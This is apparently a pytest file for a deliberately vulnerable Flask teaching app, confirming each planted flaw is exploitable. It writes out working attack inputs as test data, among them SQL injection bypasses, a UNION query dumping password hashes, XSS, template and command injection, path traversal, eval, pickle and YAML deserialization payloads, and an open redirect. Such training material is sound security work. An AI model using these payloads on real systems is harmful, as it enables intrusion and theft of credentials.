"""Proves each deliberate vulnerability is exploitable. A fix should make these fail."""
import base64
import pickle

import pytest

import app as vuln


@pytest.fixture()
def client(tmp_path, monkeypatch):
    monkeypatch.setattr(vuln, "DB_PATH", str(tmp_path / "test.db"))
    monkeypatch.setattr(vuln, "UPLOAD_DIR", str(tmp_path / "files"))
    vuln.init_db()
    return vuln.app.test_client()


def test_sql_injection_login_bypass(client):
    r = client.post("/login", data={"username": "admin' --", "password": "x"})
    assert r.status_code == 200 and b"admin" in r.data


def test_sql_injection_search_dumps_hashes(client):
    r = client.get("/search?q=' UNION SELECT id, password FROM users --")
    assert b"0192023a7bbd73250516f069df18b500" in r.data  # md5("admin123")


def test_reflected_xss(client):
    r = client.get("/greet?name=<script>alert(1)</script>")
    assert b"<script>alert(1)</script>" in r.data


def test_ssti(client):
    client.post("/comments", data={"author": "a", "body": "{{7*7}}"})
    assert b"49" in client.get("/comments").data


def test_command_injection(client):
    r = client.get("/ping?host=127.0.0.1; echo INJECTED")
    assert b"INJECTED" in r.data


def test_path_traversal(client, tmp_path):
    (tmp_path / "secret.txt").write_text("outside the upload dir")
    r = client.get("/download?file=../secret.txt")
    assert b"outside the upload dir" in r.data


def test_idor(client):
    assert b"hunter2" in client.get("/notes/1").data


def test_eval_injection(client):
    assert client.get("/calc?expr=__import__('os').getpid()").status_code == 200


def test_pickle_deserialization(client):
    payload = base64.b64encode(pickle.dumps({"pwned": True})).decode()
    assert b"pwned" in client.post("/load-session", data={"data": payload}).data


def test_unsafe_yaml(client):
    r = client.post("/import-config", data="!!python/object/apply:os.getpid []")
    assert r.status_code == 200


def test_open_redirect(client):
    r = client.get("/redirect?next=https://evil.example")
    assert r.headers["Location"] == "https://evil.example"


def test_predictable_reset_token(client):
    a = client.get("/reset-token?user=alice").get_json()["token"]
    b = client.get("/reset-token?user=alice").get_json()["token"]
    assert a == b


def test_broken_access_control(client):
    r = client.get("/admin/users", headers={"X-Admin": "true"})
    assert r.status_code == 200 and b"0192023a7bbd73250516f069df18b500" in r.data


def test_csrf_state_change_via_get(client):
    assert client.get("/delete-comments").status_code == 200
